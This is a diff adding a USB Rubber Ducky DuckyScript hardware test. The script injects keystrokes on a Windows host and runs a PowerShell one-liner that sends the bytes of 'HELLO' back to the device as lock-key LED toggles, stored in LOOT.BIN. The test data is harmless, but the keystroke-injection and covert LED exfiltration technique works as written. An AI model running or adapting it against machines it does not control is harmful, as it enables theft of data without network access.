@@ -1,0 +1,32 @@
+REM ============================================================
+REM HW TEST 3 - KEYSTROKE REFLECTION -> LOOT.BIN  (Windows target)
+REM Exfils the 5 ASCII bytes "HELLO" back to the Ducky over the
+REM lock-LED channel.  After running, the FIRST 5 BYTES of LOOT.BIN
+REM on the SD card must be:  48 45 4C 4C 4F   ("HELLO").
+REM
+REM PREREQUISITE: an empty LOOT.BIN must already exist in the SD
+REM card root, pre-sized to at least 512 bytes of zeros (one sector).
+REM Without it the write is safely skipped (see exfil_flush()).
+REM
+REM $_EXFIL_LEDS_ENABLED flashes the LED as each byte is saved.
+REM ============================================================
+ATTACKMODE HID
+DELAY 2000
+
+SAVE_HOST_KEYBOARD_LOCK_STATE
+$_EXFIL_MODE_ENABLED = TRUE
+$_EXFIL_LEDS_ENABLED = TRUE
+
+REM Host-side: turn "HELLO" into a NUMLOCK(1)/CAPSLOCK(0) bit stream,
+REM MSB first, terminated by a single SCROLLLOCK, and reflect it back
+REM via SendKeys so the Ducky records it bit-by-bit into LOOT.BIN.
+GUI r
+DELAY 500
+STRINGLN powershell "$b=[Text.Encoding]::ASCII.GetBytes('HELLO');$o='';foreach($x in $b){foreach($a in 0x80,0x40,0x20,0x10,0x08,0x04,0x02,0x01){if($x-band$a){$o+='{NUMLOCK}'}else{$o+='{CAPSLOCK}'}}};$o+='{SCROLLLOCK}';Add-Type -A System.Windows.Forms;[System.Windows.Forms.SendKeys]::SendWait($o)"
+
+REM The final SCROLLLOCK toggle ends the stream and releases this wait.
+WAIT_FOR_SCROLL_CHANGE
+
+$_EXFIL_MODE_ENABLED = FALSE
+RESTORE_HOST_KEYBOARD_LOCK_STATE
+LED_G
